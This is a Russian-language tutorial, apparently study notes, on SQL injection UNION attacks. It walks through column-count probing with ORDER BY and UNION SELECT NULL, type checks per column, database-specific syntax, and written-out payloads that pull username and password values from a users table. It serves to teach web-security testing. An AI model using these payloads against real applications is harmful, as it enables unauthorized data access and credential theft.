Если приложение уязвимо к SQLi и результаты запроса возвращаются в ответах приложения, можно использовать `UNION` для извлечения данных из других таблиц базы данных.

`UNION` позволяет выполнить один или несколько дополнительных запросов `SELECT` и добавить их результаты к исходному запросу. Например:
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
Этот SQL-запрос возвращает единый результирующий набор с двумя столбцами, содержащий значения из столбцов a и b таблицы table1 и столбцов c и d таблицы table2.

Чтобы запрос с UNION работал, должны быть выполнены два ключевых требования:
1. Отдельные запросы должны возвращать одинаковое количество столбцов.  
2. Типы данных в каждом столбце должны быть совместимы между отдельными запросами. 

Что нужно выяснить перед атакой:
1. Сколько столбцов возвращается исходным запросом.  
2. Какие столбцы подходят по типу.

## Определение необходимого количества столбцов

### Первый метод: ORDER BY

Один из методов заключается во внедрении серии конструкций ORDER BY с последовательным увеличением указанного индекса столбца до тех пор, пока не возникнет ошибка.


```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
и т. д.
```

Когда указанный индекс столбца превышает количество фактических столбцов в результирующем наборе, база данных возвращает ошибку, например: `The ORDER BY position number 3 is out of range of the number of items in the select list.`

Приложение может вернуть ошибку базы данных в своём HTTP-ответе, но может вернуть обобщённую ошибку или просто не вернуть результатов.

### Второй метод: UNION SELECT с NULL

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
и т. д.
```

Если количество `NULL` не совпадает с количеством столбцов, база данных возвращает ошибку.

Используется `NULL` так как тип данных в столбцах должен быть совместим между запросами, а `NULL` приводится к любому типу, поэтому это максимизирует вероятность срабатывания.

Приложение может вернуть ошибку базы данных в своём HTTP-ответе, но может вернуть обобщённую ошибку или просто не вернуть результатов.

Когда количество NULL совпадает с количеством столбцов, база данных возвращает дополнительную строку в результирующем наборе, содержащую значения NULL в каждом столбце.

## Синтаксис, зависящий от базы данных

В Oracle каждый запрос `SELECT` должен использовать `FROM` и указывать действительную таблицу. В Oracle есть встроенная таблица под названием `dual`, которую можно использовать для этой цели:
`' UNION SELECT NULL FROM DUAL--`

В MySQL последовательность из двух дефисов должна сопровождаться пробелом. В качестве альтернативы для обозначения комментария можно использовать символ решётки #.

## Поиск столбцов с подходящим типом данных

После того определения количество столбцов, можно проверить каждый столбец, чтобы выяснить, может ли он хранить определённый тип данных. Для этого можно отправить серию полезных нагрузок `UNION SELECT`, которые поочерёдно помещают значение нужного типа в каждый столбец. Например, если запрос возвращает четыре столбца:
```
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'--
```

Если тип данных столбца несовместим со строковыми данными, внедрённый запрос вызовет ошибку базы данных.

Если ошибка не возникает и ответ приложения содержит некоторый дополнительный контент, включая внедрённое строковое значение, то соответствующий столбец подходит для извлечения строковых данных.

## Извлечение интересующих данных

После определения количества столбцов и определения столбцов с типом строки, можно приступать к извлечению данных.

Например:
- Исходный запрос возвращает два столбца, оба из которых могут содержать строковые данные;
- Точка внедрения — это строка в кавычках внутри предложения WHERE;
- База данных содержит таблицу с именем users со столбцами username и password.

В этом примере возможно извлечь содержимое таблицы users, отправив следующий ввод:
`' UNION SELECT username, password FROM users--`

Чтобы выполнить эту атаку, вам нужно знать, что существует таблица с именем users с двумя столбцами — username и password. Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.

## Извлечение нескольких значений в одном столбце

Для извлечения нескольких столбцов таблицы в необходимо объединить значения в одну строку.

Например, в Oracle вы можете отправить следующий ввод:
`' UNION SELECT username || '~' || password FROM users--`

Здесь используется последовательность из двух вертикальных черт `||`, которая является оператором конкатенации строк. Внедрённый запрос объединяет значения полей username и password, разделяя их символом ~.

Разные базы данных используют разный синтаксис для конкатенации строк: [SQLi-cheat-sheet](SQLi-cheat-sheet.md)
